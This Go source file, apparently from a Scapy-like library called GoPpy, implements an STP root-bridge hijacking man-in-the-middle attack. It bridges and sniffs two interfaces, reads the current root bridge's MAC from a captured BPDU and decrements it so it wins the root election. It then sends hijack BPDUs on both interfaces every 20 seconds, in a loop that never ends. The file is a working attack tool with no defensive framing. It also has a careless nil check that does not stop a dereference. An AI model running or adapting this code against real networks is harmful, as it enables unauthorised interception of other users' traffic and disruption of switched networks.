package higherlevel

import (
	"fmt"
	"github.com/tiagomdiogo/GoPpy/sniffer"
	"github.com/tiagomdiogo/GoPpy/supersocket"
	"github.com/tiagomdiogo/GoPpy/utils"
	"log"
	"strconv"
	"strings"
	"time"
)

func StpRootBridgeMitM2(iface1, iface2 string) {

	ss, err := supersocket.NewSuperSocket(iface1, "")
	if err != nil {
		log.Fatal(err)
	}

	go sniffer.BridgeAndSniff(iface1, iface2)

	pkt, err := ss.Recv()
	if err != nil {
		log.Fatal(err)
	}

	stpLayer := utils.GetSTPLayer(pkt)
	if stpLayer != nil {
		fmt.Println("Received an STP packet")
	}

	rootString := stpLayer.RouteID.HwAddr.String()
	rootStringAux := strings.ReplaceAll(rootString, ":", "")
	rootInt, err := strconv.ParseInt(rootStringAux, 16, 64)
	if err != nil {
		log.Fatal(err)
	}
	rootInt -= 1

	rootMacHex := fmt.Sprintf("%012x", rootInt)
	parts := make([]string, 0, 6)
	for i := 0; i < len(rootMacHex); i += 2 {
		parts = append(parts, rootMacHex[i:i+2])
	}
	rootMac := strings.Join(parts, ":")

	params := map[string]interface{}{
		"rootmac":   rootMac,
		"bridgemac": rootMac,
		"rootid":    stpLayer.RouteID.SysID,
		"bridgeid":  stpLayer.RouteID.SysID,
	}

	for {
		stpRootBridgeHijack(iface1, params)
		stpRootBridgeHijack(iface2, params)
		time.Sleep(20 * time.Second)
	}

}
